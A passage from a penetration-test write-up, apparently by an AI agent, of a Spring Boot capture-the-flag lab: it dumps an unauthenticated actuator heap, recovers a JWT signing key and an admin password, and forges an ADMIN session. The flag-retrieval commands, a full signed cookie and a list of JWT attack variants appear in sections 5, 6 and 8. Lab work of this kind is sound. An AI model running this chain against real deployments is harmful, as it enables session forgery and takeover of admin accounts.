Object references (`/apadrinar/{id}`) are a penguin id from a public list, not
another user's record. Not exhaustively fuzzed; source-read.

**C-5 — H2 console is off and DevTools is absent.** `/h2-console` → `404`.
`spring-boot-devtools` is not in the classpath at all. Both are the *framework
defaults working*, and this is the control that makes §3.1 a deployment finding
rather than "Spring Boot is insecure by default": a related default
(`h2.console.enabled=false`, devtools absent) is holding right next to the one that
is not.

**C-6 — No `Whitelabel` error page, anywhere.** Every error I could induce returned
the Boot 3 JSON body, never the HTML error view:

```
GET  /noexiste          404 application/json  {"timestamp":…,"status":404,"error":"Not Found","path":"/noexiste"}
GET  /apadrinar/abc     405 application/json  Allow: POST
POST /apadrinar/abc     400 application/json  {"status":400,"error":"Bad Request"}
GET  /actuator/env/xx   404  Content-Length: 0
```

No stack trace, no class name, no framework version, no internal path in any error
body. This is the *absence* of a finding — the prompt's expected
"Whitelabel error page leaks versions" case **did not fire**, and the reason is
`server.error.include-*` at their defaults plus an app that declares no
`ErrorController`. I am reporting it as a control that held rather than quietly
dropping it, because "I looked for the stack trace and it is not there" and "I did
not look" must not read the same.

**C-7 — Actuator config sanitization works as documented** — the 96/96 mask of §1.1
*is* this control, and it held. It is also the most dangerous control on the target
for the analyst's own reporting, which is why it is listed here and dissected in
§1.1 rather than buried.

**C-8 — A rotated key was not silently still-live.** §1.3's two-forge differential:
2024 → `200`, 2023 → `403`. The lab's claim held under test. The *retention* of
2023 is a separate finding (§3.3); its continued validity is not.

---

## 5. Chain, in order, with each jump justified

```
[0] anonymous  ──► [1] GET /actuator (discovery page)      200, 19 link templates
[1] anonymous  ──► [2] GET /actuator/heapdump             200, 64 583 893 B
[2] local     ──► [3] grep -a the HPROF for key-shaped   6 secret classes, cleartext
[3] local     ──► [4] distinguish real key from decoy     forge × 2 → 200 / 403
[4] local     ──► [5] forge HS256 JWT, role=ADMIN         self-signed, no account
[5] anonymous  ──► [6] GET /admin  Cookie: session=<forged> 200, reward
```

| # | Jump | Why this one, and what the alternative was |
|---|---|---|
| 0→1 | Full TCP scan first | `decision-making.md`: the name is a label. One `nmap -p-` retired "where is the app" in 8 s and told me the lab is one port — which is what made a 19-endpoint surface on that one port the *whole* story rather than a fragment. |
| 1→2 | Discovery page → `heapdump` | The discovery page is the framework telling me the endpoint set. Chosen over `/actuator/env` **because of the measurement in §1.1** — `env` was read first and returned no value, so it could not be the vector. Reading the *masked* endpoint first is what made the *unmasked* one obvious. |
| 2→3 | Download → `grep -a` | The 64 MB is a **Java HPROF dump** (`file` confirms the magic), which is uncompressed and therefore greppable. `grep -a` on the raw bytes, not a parser: the roundtrip discipline (`decision-making.md`) applies to a memory dump the way it applies to a crypto artifact, and I did not need a full object-graph parse for six cleartext strings. |
| 3→4 | 6 candidates → 1 | **This is the step the lab tried to make me skip** (§1.3). Two of the six are HMAC-key-shaped and differ by one year. Neither the property name nor the comment decides it; only a signature does. And a greping attacker who picks the *first* match in a `grep -n` listing gets a `403` and concludes the dump was a red herring. |
| 4→5 | Key → forged token | The token must be **signed**, not assembled: `sub`, `role`, `iat`, `exp` (`JwtUtil.generateToken:30-33`). I used the *same* `role` claim name and HS256-with-`verifyWith`, because a forgery is only correct if it is the server's own construction. |
| 5→6 | Forged cookie → `ADMIN` | `JwtAuthFilter:32` reads `claims.get("role", String.class)` into `CurrentUser`, and `isAdmin()` is `"ADMIN".equals(role)`. So the *entire* authorization decision is one unsigned-if-unkeyed string in the token body. Confirmed live, not reasoned. |

**The admin password route (3.2) is a second, independent, *shorter* path to the
same place** — heap → cleartext password → `POST /login` → real `302` with a
server-signed `ADMIN` cookie, with no forgery and no candidate ambiguity. I did
**not** use it, and the reason is worth recording: it is the path that would still
work after a partial fix that rotates the JWT key but leaves the dump exposed. Two
findings, one outcome, two fixes — §3.2 and §3.3 must both be closed.

**What I did not need, and why that is a finding, not luck:** no `java` primitive, no
serialization gadget, no SpEL, no SSTI, no upload, no SQL, no CVE. The entire
compromise is **read the diagnostic output, then sign a token**. The lab is named
for a framework and the framework supplied the whole chain — but via its
*configuration surface*, not via a vulnerability in the framework.

---

## 6. Reward — literal

```
$ ADMIN=$(python3 forge.py '<heap-recovered signing key>' ADMIN)
$ curl -s -b "session=$ADMIN" http://172.17.0.11:8080/admin | grep -o 'FLAG{[^}]*}'
FLAG{actuator_h34pdump_jwt_f0rg3ry_pwn3d}
```

And the raw `Set-Cookie` from the password route, for the record:

```
HTTP/1.1 302
Set-Cookie: session=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJBRE1JTiIsImlhdCI6MTc5MDU2OTA0MywiZXhwIjoxNzkwNTcyNjQzfQ.Mbu9nAqIiWW-uZG77MMO_dgfPXkBWlFWFEyQwqJf1mI; Max-Age=3600; Path=/; HttpOnly
Location: http://172.17.0.11:8080/perfil
```

The reward is hardcoded in the template model
(`AdminController.java:48` — `model.addAttribute("flag", …)`) and rendered by
`templates/admin.html`. It is served by the application, not read from the
filesystem, so there is no filesystem reward to miss.

The JWT was forged, not stolen: the `Mbu9nAq…` in the second cookie is a signature
**the server computed** over a password it verified, and the first token is one I
computed over a key the heap gave me. Both were produced in this run by the
identity under test; no artifact was carried over from a previous engagement.

---

## 7. Spring Boot: the measurement criterion

The prompt for this engagement asked for a section on Spring Boot that supplies a
**criterion for measuring**, not a list of endpoints. The criterion this lab yields
is a **trichotomy on the response body**, applied per endpoint, before any finding
is written:

> For any exposed diagnostic endpoint, decide three things separately:
> **(a) reachable** — is there an authentication decision in front of it, and in
> *which component*;
> **(b) disclosed** — does the response carry a **value**, or only a **name**, or a
> **masked placeholder**?
> **(c) decisive** — is the disclosed value *load-bearing*: does possessing it change
> what the application will do?
>
> (b) is a measurement of the bytes. (c) is a measurement of the target. A finding
> that skips (c) is a finding about a list of key names.

Measured on this target, endpoint by endpoint:

| Endpoint | (a) reachable? | (b) what the body carries | (c) decisive? | Verdict |
|---|---|---|---|---|
| `/actuator/env` | anon | **96 names + origins, 96 `******`, 0 values** | no | topology disclosure, low |
| `/actuator/configprops` | anon | no `app.*` at all (`@Value` is not bound) | no | near-empty |
| `/actuator/heapdump` | anon | **6 cleartext secret classes + a live heap** | **yes — signs every session, and holds a cleartext admin password** | **critical** |
| `/actuator/health` | anon | engine name, path, capacity (`show-details=always`) | no | low |
| `/actuator/mappings` / `beans` | anon | full route table, full object graph | no (readiness) | low |
| `/actuator/threaddump` | anon | stacks, locks | no | low |
| **`/actuator/loggers` `POST`** | anon **write** | `204` | **yes — mutates the app's own log policy** | **high**, different class |
| `/h2-console` | `404` | — | — | control held |
| DevTools | absent from classpath | — | — | control held |

**The three conclusions this table supports that a bare endpoint list would not:**

1. **`/actuator/env` is not a credential disclosure here, and the framework's own
   code says why in four lines** (`Sanitizer.sanitize`: `if (!showUnsanitized)
   return "******"`). The mask is **one property** (`show-values=ALWAYS`) from a
   critical finding. So the honest report is *both* "no secret is disclosed today"
   and "the switch that discloses every secret is a single documented key whose
   default is safe, and a reviewer must verify its value on every deployment." A
   scanner that greps the response for `password` and reports the key **name** has
   produced a false positive *and* has missed the real vector.
2. **A heap dump is categorically different from a config dump, and the difference
   is the finding.** A config endpoint shows *configuration*; a heap dump shows
   *runtime state*, which by construction includes (a) the config file's own bytes
   as loaded, (b) values resolved from other sources, and (c) **secrets that exist
   only in memory** — the plaintext password passed to BCrypt, the `static` list
   that pins a retired key forever. **You cannot enumerate (c) from configuration,
   so "read the config to know what to look for" is insufficient.** Any
   recon guidance that stops at the properties file will find §3.2(1) and §3.2(2)
   and miss §3.2(3) entirely, and §3.2(3) is the one that logs you in.
3. **A management surface with no auth is measured in the artifact, not from the
   response.** `exposure.include=*` is one operator line; the *defect* is the
   absence of any authentication for that path, and the way to establish it is to
   read the classpath and the bean list out of the jar
   (`spring-security-web` absent, no `SecurityFilterChain`, the only `catch` in the
   auth filter is empty and `chain.doFilter` is unconditional). **This generalises
   past Spring**: for any JVM framework, "is the framework's own auth present" is a
   question about the artifact, and a `200` from a diagnostic endpoint cannot
   distinguish "secured and allowed" from "there is no security subsystem at all".
   In this app, `/admin` answers `403` — an *application* decision — while
   `/actuator` answers `200` with no decision anywhere. **Two components, two
   decisions, two fixes**, and the same `management.server.port`-on-a-bound-
   interface split that separates an out-of-band management plane from a data plane
   in `infrastructure.md`.

**On SpEL in configuration properties**, which was expected and did not occur: no
`@Value` in this app evaluates an expression, `spring-boot-properties` SpEL injection
requires a specific data-binding shape that no endpoint here exposes, and I found no
request-reachable path that writes configuration. It is a real and distinctive
Spring vector — code injection through a *configuration file* rather than a request
parameter, which changes what counts as "user input" — but **this lab does not use
it**, and reporting it would have been a lab-design guess, not a measurement.

**On `CVE-2022-22965` (Spring4Shell) and friends: explicitly discarded, with
reason.** No request-reachable data-binding path, no `spring-beans` binding of
request parameters into property-setter types, no `spring-mvc` on a Tomcat that
accepts the crafted `class.module.classLoader` form. Discarded on the preconditions
from the advisory, not on a version number.

---

## 8. Tested / not tested / could not test

**Tested, with evidence in this document**

- Full TCP port scan, `-sV -Pn -p-`, 65534 closed.
- Full actuator enumeration: 19 discovery links, status + size on 18 paths.
- `env` value-masking measured across all 96 properties in all 5 property sources.
- `configprops` queried and confirmed not to contain `@Value`-bound properties.
- `heapdump` downloaded (63 763 393 B), identified as HPROF, 7 candidate secrets
  grepped, 2 HMAC-key candidates discriminated by signature.
- JWT: 7 forged tokens (6 negative, 1 positive control) covering `alg:none`, `alg`
  substitution, empty signature, two `kid` selectors, missing `role`, expired `exp`.
- Admin password recovered from the heap, **used** against `/login`.
- `/admin/restore` deserialization: 3 states (invalid base64 / valid base64 non-stream
  / valid stream), anonymous `403` and `ADMIN` `200`.
- `/actuator/loggers` write, differential in **both** directions.
- Template injection: `__${7*7}__` as a registered username, reflected literally.
- Error surfaces: 404, 405, 400, actuator 404 — none produced an HTML error page.
- Full application source decompiled and read (8 classes + `application.properties`).
- Classpath inventory for devtools / h2-console / spring-security-web / gadget hosts.
- Actuator defaults read from the jar's own `spring-configuration-metadata.json`.
- `Sanitizer.sanitize` read from `spring-boot-actuator-3.2.5.jar` to establish *why*
  the mask is universal.

**Not tested (and not claimed)**

- **No deserialization gadget was built or fired.** Sink proven, gadget host proven
  present, RCE **not** demonstrated. See §3.5.
- **No CSRF was delivered cross-origin.** No browser was run; §3.8 is source-read
  plus cookie attributes, and the status-code-only CSRF error is explicitly avoided.
- **No privilege escalation.** There is no shell in this engagement, so
  `decision-making.md` §8's mandatory `id` was answered from the image configuration
  (`User: www-data`, `uid=33(www-data)`) rather than from inside a primitive.
- No parameter-tampering fuzz on `/register` (C-2, C-4 are source-read).
- No rate-limit / brute-force assessment on `/login`.
- No test of `/actuator/threaddump`'s content beyond its existence and size.

**Could not test (declared, not simulated)**

- **No UDP scan.** `nmap -sU` needs root and this host has none; `ipmitool` is not
  installed. Per `decision-making.md` this is a **coverage gap**, not a closed port.
  It is closed here by the image's own `ExposedPorts: 8080/tcp` manifest and by the
  absence of any UDP listener in the shipped image, which is weaker evidence than a
  live exchange and is labelled as such.
- `smbclient` and `sshpass` are not installed on this host; **not needed** — this
  lab has neither SMB nor SSH, and I did not emulate or assume either.

---

## 9. Design observation

The lab's own `application.properties` is a **solution document**. It names the
vulnerability class (`(!!!) CONFIGURACION VULNERABLE DE ACTUATOR`), the exact
mechanism (`Enmascarado en /actuator/env pero EN CLARO dentro del heapdump`), the
decoy and its status (`SENUELO: ya no firma nada`), the correct grep bait
(`contiene la palabra 'secret'`), and the noise an analyst must sort through. Read
top to bottom, the file *is* the intended chain.

Per `decision-making.md` §7 that is a **stopping condition**, and this engagement
confirms the rule from the other side: **the file was right about everything it
claimed, and the two findings that mattered most are the two it did not claim.**

- It claims the actuator is the problem. It does not claim that the actual defect is
  the **absence of any authentication component** — which is what makes the
  remediation non-obvious, because "narrow `exposure.include`" is the answer the
  file's own framing suggests and it leaves `/actuator/loggers` writable and
  `/actuator/heapdump` reachable to anything that can bind the port.
- It claims the 2023 key is inert. Correct, and verified. It does not claim that
  **a rotated signing key is still a live-shaped secret sitting in a heap dump**,
  which is a finding about the *rotation policy* and has a different fix.
- It says nothing about `/admin/restore`. That endpoint is a **CWE-502 sink with
  `commons-collections-3.2.1` on the classpath, reachable by the very `ADMIN` role
  this lab teaches you to forge.** The intended chain and the accidental one land in
  the same place, and the intended one is strictly weaker.
- It says nothing about the admin password being **in the heap in cleartext**, which
  is a *shorter* path to the reward than the one the file describes.

So the annotations are a strict subset, exactly as the rule says — and the sharper
statement this engagement adds is the one from `BALUHOME`: **a lab that hands you the
answer makes verification the work, and verification is not free.** Here it was
~40% of the engagement: a `403` for the decoy key, a 96/96 masking census, a
two-direction logger differential, a seven-token JWT matrix with a positive control,
and a three-state deserialization probe. None of that is in the properties file. An
analyst who read the file and immediately forged a token would have got the right
flag and a report with **zero** findings in it.

The lab is also, unusually, **honest about its own bait**. It planted a decoy key
next to the real one and *told you it was a decoy* — which is a rare generosity, and
it is worth naming as a design choice: it removes the cheapest way to succeed (blind
grep, first match) and forces the one measurement that generalises. The better
version of this lab would delete the comments, keep the decoy, and add a third
key-shaped string with no annotation at all.

---

## 10. Restoration

The lab was returned to its shipped state by **destroying and recreating the
container from the image**, which is stronger than undoing my changes one at a time:

```
$ docker rm -f pingupenguin_container && docker run -d --name pingupenguin_container pingupenguin:latest
$ docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' pingupenguin_container
172.17.0.11
$ docker ps --format '{{.Names}}\t{{.Status}}\t{{.Ports}}'
pingupenguin_container	Up 8 seconds	8080/tcp
```

Verified in the fresh container:

| State I changed | Verification in the recreated container |
|---|---|
| `org.springframework.web` log level set to `DEBUG` (§3.4) | `configuredLevel= None effective= INFO` — shipped default |
| Registered account `probe1` and `__${7*7}__` (§C-3) | `POST /login username=probe1` → `200` with `incorrectos`; a valid login is a `302` with `Set-Cookie`, so both accounts are gone (`ddl-auto=create-drop` on `jdbc:h2:mem:`) |
| Two forged `ADMIN` sessions (§6) | `GET /admin` anonymous → `403` |

Nothing was written to the host filesystem outside `/tmp/opencode/pp` (the extracted
jar, the heap dump, the two Python helpers). `auto_deploy.sh` was never executed.
The `pingupenguin:latest` image was loaded and left in place, as shipped.
